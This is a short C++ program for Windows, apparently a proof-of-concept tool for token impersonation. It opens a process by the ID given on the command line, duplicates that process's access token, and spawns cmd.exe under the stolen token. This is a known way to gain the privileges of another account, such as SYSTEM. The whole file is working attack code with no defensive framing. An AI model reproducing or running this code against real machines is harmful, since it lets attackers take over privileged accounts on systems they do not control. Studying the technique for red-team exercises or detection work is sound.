#include "pch.h"
#include <windows.h>
#include <iostream>

int main(int argc, char** argv) {
    char *pid_c = argv[1];
    DWORD PID_TO_IMPERSONATE = atoi(pid_c);
    HANDLE tokenHandle = NULL;
    HANDLE duplicateTokenHandle = NULL;
    STARTUPINFO startupInfo;
    PROCESS_INFORMATION processInformation;
    ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
    ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
    startupInfo.cb = sizeof(STARTUPINFO);	

    HANDLE processHandle = OpenProcess(PROCESS_QUERY_INFORMATION, true, PID_TO_IMPERSONATE);
    printf("OpenProcess() Return Code: %i\n", processHandle);
    printf("OpenProcess() Error: %i\n", GetLastError());

    BOOL getToken = OpenProcessToken(processHandle, TOKEN_DUPLICATE, &tokenHandle);
    printf("OpenProcessToken() Return Code: %i\n", getToken);
    printf("OpenProcessToken() Error: %i\n", GetLastError());

    BOOL duplicateToken = DuplicateTokenEx(tokenHandle, TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);
    printf("DuplicateTokenEx() Return Code: %i\n", duplicateToken);
    printf("DupicateTokenEx() Error: %i\n", GetLastError());

    BOOL createProcess = CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &startupInfo, &processInformation);
    printf("CreateProcessWithTokenW Return Code: %i\n", createProcess);
    printf("CreateProcessWithTokenW Error: %i\n", GetLastError());

    if (GetLastError() == NULL)
      printf("Process spawned!\n");
    else
      printf("Process failed to spawn, check last error :(\n");

    return 0;
}
